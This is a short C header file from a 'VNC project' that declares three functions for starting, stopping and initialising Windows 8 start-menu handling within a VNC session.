//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: start_menu.h
// $Revision: 206 $
// $Date: 2014-07-16 12:50:30 +0400 (Ср, 16 июл 2014) $
// description:
//	win8 start menu

#ifndef __START_MENU_H_
#define __START_MENU_H_

void StartMenuStart(PVNC_SESSION pSession);
void StartMenuStop(PVNC_SESSION pSession);
WINERROR
	StartMenuInitialize(
		IN PVNC_SESSION pSession
		);

#endif // __START_MENU_H_
